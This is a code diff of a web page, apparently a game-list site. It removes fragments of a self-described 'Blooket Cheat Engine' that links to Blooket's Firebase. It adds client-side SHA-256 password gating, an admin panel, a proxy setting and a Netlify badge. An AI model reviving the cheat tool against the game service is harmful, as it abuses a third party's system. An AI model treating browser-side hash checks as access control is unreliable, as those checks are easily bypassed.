-            select.innerHTML = '<option>— no others —</option>';
-        }
-    } catch (e) {
-        console.error('Player list error:', e);
-    }
+function sha256js(str){
+  const b=new TextEncoder().encode(str),l=b.length,n=((l+9+63)>>6)<<4,w=new Uint32Array(n);
+  for(let i=0;i<l;i++)w[i>>2]|=b[i]<<(24-8*(i&3));
+  w[l>>2]|=0x80<<(24-8*(l&3));w[n-1]=l*8;
+  const K=[],H=[];
+  for(let p=2;K.length<64;p++){let q=true;for(let d=2;d*d<=p;d++)if(p%d===0){q=false;break}
+    if(q){if(H.length<8)H.push(Math.floor((Math.sqrt(p)%1)*4294967296)|0);K.push(Math.floor((Math.cbrt(p)%1)*4294967296)|0)}}
+  const r=(x,k)=>(x>>>k)|(x<<(32-k));
+  for(let o=0;o<n;o+=16){
+    const W=new Int32Array(64);for(let i=0;i<16;i++)W[i]=w[o+i];
+    for(let i=16;i<64;i++){const x=W[i-15],y=W[i-2];W[i]=(W[i-16]+(r(x,7)^r(x,18)^(x>>>3))+W[i-7]+(r(y,17)^r(y,19)^(y>>>10)))|0}
+    let [a,b2,c,d,e,f,g,h]=H;
+    for(let i=0;i<64;i++){
+      const t1=(h+(r(e,6)^r(e,11)^r(e,25))+((e&f)^(~e&g))+K[i]+W[i])|0,t2=((r(a,2)^r(a,13)^r(a,22))+((a&b2)^(a&c)^(b2&c)))|0;
+      h=g;g=f;f=e;e=(d+t1)|0;d=c;c=b2;b2=a;a=(t1+t2)|0}
+    [a,b2,c,d,e,f,g,h].forEach((v,i)=>H[i]=(H[i]+v)|0)}
+  return H.map(x=>(x>>>0).toString(16).padStart(8,"0")).join("")
 }
+const sha=async t=>{const m="gameshelf:"+t;try{if(window.crypto&&crypto.subtle){const d=await crypto.subtle.digest("SHA-256",new TextEncoder().encode(m));return [...new Uint8Array(d)].map(b=>b.toString(16).padStart(2,"0")).join("")}}catch(e){}return sha256js(m)};
+function setAdmin(on){document.body.classList.toggle("admin",on);$("locked").hidden=on;$("panel").hidden=!on;try{on?sessionStorage.setItem("gs-admin","1"):sessionStorage.removeItem("gs-admin")}catch(e){}}
+$("pxurl").onchange=e=>{const v=e.target.value.trim();try{v?localStorage.setItem("gs-proxy",v):localStorage.removeItem("gs-proxy")}catch(x){}refresh()};
+$("console").onclick=()=>{try{$("pxurl").value=localStorage.getItem("gs-proxy")||SERVER}catch(x){}$("pw").value="";$("pwerr").textContent="";$("con").showModal()};
+$("unlock").onclick=async()=>{
+  const v=$("pw").value.trim();
+  try{
+    if(serverBase()){
+      try{sessionStorage.setItem("gs-pw",v)}catch(e){}
+      try{await api("POST","/auth")}catch(e){try{sessionStorage.removeItem("gs-pw")}catch(x){}$("pwerr").textContent=e.message==="Wrong password"?"Wrong password.":"Couldn't reach the server.";return}
+      setAdmin(true);
+    }else if(await sha(v)===PASS_HASH)setAdmin(true);
+    else $("pwerr").textContent="Wrong password.";
+  }catch(e){$("pwerr").textContent="Password check needs https or localhost."}
+};
+$("pw").onkeydown=e=>{if(e.key==="Enter")$("unlock").click()};
+$("pwcancel").onclick=$("close").onclick=()=>$("con").close();
+$("lock").onclick=()=>{try{sessionStorage.removeItem("gs-pw")}catch(e){}setAdmin(false);$("con").close()};
+$("newpw").oninput=async e=>{$("newhash").textContent=e.target.value?await sha(e.target.value):""};
+try{if(sessionStorage.getItem("gs-admin"))setAdmin(true)}catch(e){}
 
-// Auto refresh
-setInterval(() => {
-    if (activeGame && db) loadPlayerList();
-}, 3000);
-
-// Start
-setStatus('Ready. Enter PIN and click Join.', 'info');
-console.log('🔥 Blooket Cheat Engine Ready');
-console.log('💡 This connects directly to Blooket Firebase');
+// If the repo has a games.json, use it as the shared list for all visitors.
+const pwd=()=>{try{return sessionStorage.getItem("gs-pw")||""}catch(e){return ""}};
+async function api(method,path,body){
+  const r=await fetch(serverBase().replace(/\/$/,"")+path,{method,headers:{"X-Admin-Password":pwd(),"Content-Type":"application/json"},body:body?JSON.stringify(body):undefined});
+  if(!r.ok)throw new Error(r.status===401?"Wrong password":"Server error "+r.status);
+  return r.json();
+}
+async function loadBase(){
+  const sb=serverBase();serverOn=false;
+  if(sb){try{const r=await fetch(sb.replace(/\/$/,"")+"/games",{cache:"no-store"});if(r.ok){base=(await r.json()).map(g=>({...g,srv:true}));serverOn=true;return}}catch(e){}}
+  base=SEED;
+  try{const r=await fetch("games.json",{cache:"no-cache"});const j=r.ok?await r.json():null;if(Array.isArray(j)&&j.length)base=j.map((g,i)=>({id:g.id||"r"+i,...g}))}catch(e){}
+}
+const refresh=()=>loadBase().then(render);
+function start(){document.body.classList.remove("locked");refresh()}
+try{if(localStorage.getItem("gs-site")===SITE_HASH)start()}catch(e){}
+async function trySite(){
+  $("gerr").textContent="Checking...";
+  try{
+    if(await sha($("gpw").value.trim())===SITE_HASH){try{localStorage.setItem("gs-site",SITE_HASH)}catch(x){}$("gerr").textContent="";start()}
+    else $("gerr").textContent="Wrong password."
+  }catch(x){$("gerr").textContent="Error: "+x.message}
+}
+$("gform").addEventListener("submit",e=>{e.preventDefault();trySite()});
+$("gbtn").addEventListener("click",trySite);
 </script>
-</body>
-</html>
+
+
+<script async="" src="/.netlify/scripts/hud?variant=public" data-nf-variant="public" data-netlify-site-id="48a6a1e6-c106-4f46-9da3-e24cb4ad958a" data-app-host="app.netlify.com" data-account-tier="free"></script>
+<iframe id="nl-badge-frame" title="Powered by Netlify" srcdoc="<!doctype html><html><head><meta charset="utf-8"><meta name="color-scheme" content="dark"><style>
+    :root{--nl-vw:1180px;--nl-vh:688px}
+    *{box-sizing:border-box}
+    html,body{margin:0;padding:0;background:transparent;overflow:hidden}
+    body{display:flex;align-items:flex-end;justify-content:flex-end;height:100vh;
+      padding:8px 18px 18px 8px;
+      font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;font-size:14px;line-height:1.5;color:#f4f9f9;-webkit-font-smoothing:antialiased}
+    .nl-wrap{display:flex;flex-direction:column;align-items:flex-end;gap:10px;width:max-content;max-width:calc(var(--nl-vw,100vw) - 26px)}
+    button{font-family:inherit;cursor:pointer}
+    :focus-visible{outline:2px solid #32e6e2;outline-offset:2px;border-radius:6px}
+    .nl-icon-btn{position:relative;flex:none;width:30px;height:30px;display:inline-flex;align-items:center;justify-content:center;border-radius:8px;border:1px solid transparent;background:transparent;color:#d5e3e6;transition:background .15s ease,color .15s ease}
+    .nl-icon-btn:hover{background:rgba(255,255,255,0.08);color:#f4f9f9}
+    .nl-tap::after{content:"";position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);
+      width:max(100%,44px);height:max(100%,44px)}
+    @keyframes nl-rise{from{opacity:0;transform:translateY(10px) scale(.97)}to{opacity:1;transform:none}}
+    @media (prefers-reduced-motion:reduce){*{animation-duration:.01ms!important;transition:none!important}}
+  
+      .nl-card{position:relative;display:none;width:min(340px,calc(var(--nl-vw,100vw) - 26px));max-height:calc(var(--nl-vh,100vh) - 84px);overflow-y:auto;background:linear-gradient(180deg,#132832 0%,#0e1e25 100%);border:1px solid rgba(255,255,255,0.09);border-radius:18px;padding:18px;transform-origin:bottom right;animation:nl-rise .3s cubic-bezier(.34,1.4,.4,1) both}
+      .nl-card.open{display:block}
+      .nl-card-close{position:absolute;top:10px;right:10px}
+      .nl-card h2{margin:0;padding-right:30px;font-size:16px;font-weight:750;letter-spacing:-0.015em;line-height:1.35}
+      .nl-card h2 em{font-style:normal;background:linear-gradient(90deg,#32e6e2,#4d7cfe,#9a6bff);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;color:transparent}
+      .nl-card p{margin:8px 0 0;font-size:12.5px;color:#d5e3e6}
+      .nl-prompt{position:relative;margin-top:14px;background:#10222b;border:1px solid rgba(255,255,255,0.09);border-radius:14px;padding:10px 12px;transition:border-color .15s ease,box-shadow .15s ease}
+      .nl-prompt:focus-within{border-color:#05bdba;box-shadow:0 0 0 3px rgba(5,189,186,0.18)}
+      .nl-prompt textarea{display:block;width:100%;height:38px;resize:none;border:0;outline:none;background:transparent;color:#f4f9f9;font:inherit;font-size:13px;line-height:19px;padding:0 28px 0 0}
+      .nl-prompt textarea::placeholder{color:#a9bdc2}
+      .nl-send{position:absolute;right:9px;bottom:9px;width:24px;height:24px;flex:none;display:inline-flex;align-items:center;justify-content:center;border:0;border-radius:50%;background:#05bdba;color:#02191b;transition:background .15s ease}
+      .nl-send:hover{background:#32e6e2}
+      @media (pointer: coarse){
+        .nl-prompt textarea{font-size:16px;line-height:21px;height:42px}
+      }
+      .nl-or{display:flex;align-items:center;gap:10px;margin:12px 0;font-size:10.5px;font-weight:600;letter-spacing:0.08em;text-transform:uppercase;color:#a9bdc2}
+      .nl-or::before,.nl-or::after{content:"";flex:1;height:1px;background:rgba(255,255,255,0.09)}
+      .nl-drop{display:flex;align-items:center;justify-content:space-between;gap:6px;text-decoration:none;background:#1b3a45;border:1px solid rgba(255,255,255,0.09);border-radius:10px;padding:10px 12px;font-size:13px;font-weight:600;color:#cfe0e3;transition:background .15s ease,color .15s ease,border-color .15s ease}
+      .nl-drop:hover{background:#224753;color:#f4f9f9;border-color:rgba(50,230,226,0.3)}
+      .nl-drop .nl-arrow{transition:transform .18s cubic-bezier(.34,1.4,.4,1)}
+      .nl-drop:hover .nl-arrow{transform:translateX(3px)}
+      .nl-badge{display:flex;align-items:center;gap:9px;white-space:nowrap;border:1px solid rgba(255,255,255,0.09);background:linear-gradient(180deg,#142b34,#0e1e25);color:#f4f9f9;border-radius:999px;padding:9px 14px 9px 11px;font-size:13px;font-weight:600;letter-spacing:0.01em;transition:border-color .2s ease}
+      .nl-badge:hover{border-color:rgba(50,230,226,0.26)}
+      .nl-hide{display:block;width:100%;margin-top:10px;border:0;background:transparent;color:#a9bdc2;font-size:11.5px;font-weight:600;padding:4px;border-radius:8px;transition:color .15s ease}
+      .nl-hide:hover{color:#d5e3e6;text-decoration:underline}
+      .nl-badge-label{color:#d5e3e6;font-weight:500}
+      .nl-badge-brand{font-weight:750}
+    </style></head><body>
+      <div class="nl-wrap">
+        <section class="nl-card" id="nl-card" aria-label="Build your own site on Netlify">
+          <button type="button" class="nl-icon-btn nl-tap nl-card-close" id="nl-card-close" aria-label="Close"><svg width="14" height="14" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" aria-hidden="true"><path d="M4.5 4.5 11.5 11.5M11.5 4.5 4.5 11.5"/></svg></button>
+          <h2><em>Build your own site with Netlify</em></h2>
+          <p>Describe what you want, and an AI agent designs, builds and deploys it in minutes.</p>
+          <form class="nl-prompt" action="https://app.netlify.com/start" method="get" target="_blank" rel="noopener">
+            <textarea name="prompt" rows="2" required maxlength="300" autocomplete="off"
+                      enterkeyhint="go"
+                      placeholder="A shop for my handmade surfboards&hellip;"
+                      aria-label="Describe the site you want to build"></textarea>
+            <button type="submit" class="nl-send nl-tap" aria-label="Build this site"><svg width="13" height="13" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M8 12.75v-9.5M3.9 7.35 8 3.25l4.1 4.1"/></svg></button>
+            <input type="hidden" name="utm_source" value="netlify_badge">
+            <input type="hidden" name="utm_campaign" value="loops">
+            <input type="hidden" name="utm_medium" value="owned">
+            <input type="hidden" name="utm_content" value="prompt">
+            <input type="hidden" name="utm_id" value="48a6a1e6-c106-4f46-9da3-e24cb4ad958a">
+            
+          </form>
+          <div class="nl-or"><span>or</span></div>
+          <a class="nl-drop" href="https://app.netlify.com/drop?utm_source=netlify_badge&utm_campaign=loops&utm_medium=owned&utm_content=drop&utm_id=48a6a1e6-c106-4f46-9da3-e24cb4ad958a" target="_blank" rel="noopener">
+            <span>Drop a site you already have</span><span class="nl-arrow" aria-hidden="true">&rarr;</span>
+          </a>
+          
+        </section>
+        <button type="button" class="nl-badge" id="nl-badge" aria-expanded="false" aria-controls="nl-card"
+                aria-label="Powered by Netlify — build your own site">
+          <svg width="18" height="18" viewBox="-45.625 -47.625 456.25 456.25" fill="none" aria-hidden="true">
+    <path fill-rule="evenodd" clip-rule="evenodd" d="M122.608 207.222V298.975C122.608 301.415 123.574 303.775 125.317 305.518L177.467 357.668C181.06 361.261 186.932 361.261 190.525 357.668L232.675 315.519C236.268 311.926 236.268 306.053 232.675 302.434L133.119 202.878C129.231 198.99 122.608 201.726 122.608 207.222Z" fill="white"/>
+    <path fill-rule="evenodd" clip-rule="evenodd" d="M232.675 44.8449L190.525 2.69468C186.932 -0.898228 181.06 -0.898228 177.467 2.69468L125.317 54.846C123.574 56.5889 122.608 58.922 122.608 61.362V153.115C122.608 158.584 129.231 161.346 133.119 157.459L232.675 57.9031C236.268 54.3101 236.268 48.4385 232.675 44.8187V44.8449Z" fill="white"/>
+    <path fill-rule="evenodd" clip-rule="evenodd" d="M307.482 126.543L151.056 174.243C145.238 176.012 145.238 184.243 151.056 186.013L307.482 233.713C310.726 234.705 314.319 233.82 316.706 231.407L361.483 186.629C365.076 183.036 365.076 177.165 361.483 173.545L316.706 128.767C314.292 126.354 310.753 125.469 307.482 126.462V126.515V126.543Z" fill="white"/>
+    <path d="M48.6878 131.481L6.52195 173.647C2.91992 177.249 2.91992 183.089 6.52195 186.691L48.6883 228.857C52.2903 232.459 58.1302 232.459 61.7322 228.857L103.898 186.691C107.5 183.089 107.5 177.249 103.898 173.647L61.7317 131.481C58.1297 127.879 52.2899 127.879 48.6878 131.481Z" fill="white"/></svg>
+          <span><span class="nl-badge-label">Powered by</span> <span class="nl-badge-brand">Netlify</span></span>
+        </button>
+      </div>
+      <script>
+        
+    function nlSend(){
+      var wrap=document.querySelector('.nl-wrap'),boxes=[];
+      for(var i=0;i<wrap.children.length;i++){
+        var c=wrap.children[i];
+        if(!c.offsetWidth||!c.offsetHeight)continue;
+        boxes.push({x:c.offsetLeft-wrap.offsetLeft+8,
+                    y:c.offsetTop-wrap.offsetTop+8,
+                    w:c.offsetWidth,h:c.offsetHeight});
+      }
+      parent.postMessage({nlHud:'resize',
+        width:wrap.offsetWidth+26,
+        height:wrap.offsetHeight+26,
+        boxes:boxes},'*');
+    }
+    function nlSendSoon(){requestAnimationFrame(nlSend);}
+    window.addEventListener('load',nlSend);
+    window.addEventListener('message',function(e){
+      if(e.source!==parent||!e.data||e.data.nlHud!=='viewport')return;
+      var s=document.documentElement.style;
+      s.setProperty('--nl-vw',e.data.w+'px');
+      s.setProperty('--nl-vh',e.data.h+'px');
+      document.documentElement.classList.toggle('nl-narrow',e.data.w<600);
+      nlSendSoon();
+    });
+    var nlCoarse=window.matchMedia('(pointer: coarse)').matches;
+    function nlSubmit(form){
+      if(form.requestSubmit)return form.requestSubmit();
+      if(form.checkValidity&&!form.checkValidity())
+        return form.reportValidity&&form.reportValidity();
+      form.submit();
+    }
+  
+        var badge=document.getElementById('nl-badge'),card=document.getElementById('nl-card'),
+            box=card.querySelector('textarea');
+        function setOpen(open){
+          card.classList.toggle('open',open);
+          badge.setAttribute('aria-expanded',open?'true':'false');
+          nlSendSoon();
+          if(open&&!nlCoarse)box.focus();
+        }
+        box.addEventListener('keydown',function(e){
+          if(e.key==='Enter'&&!e.shiftKey){e.preventDefault();nlSubmit(box.form);}
+        });
+        badge.addEventListener('click',function(){setOpen(!card.classList.contains('open'));});
+        document.getElementById('nl-card-close').addEventListener('click',function(){setOpen(false);badge.focus();});
+        document.addEventListener('keydown',function(e){
+          if(e.key==='Escape'&&card.classList.contains('open')){setOpen(false);badge.focus();}
+        });
+        card.addEventListener('click',function(e){
+          if(e.target.closest('#nl-hide'))parent.postMessage({nlHud:'state',value:'hidden'},'*');
+        });
+      </script>
+    </body></html>" style="position: fixed; bottom: 0px; right: 0px; border: 0px; margin: 0px; padding: 0px; background: none; color-scheme: dark; z-index: 2147483645; width: 202px; height: 64px; clip-path: path("M 3 3 H 189 V 51 H 3 Z");" data-nl-ready="1"></iframe></body></html>
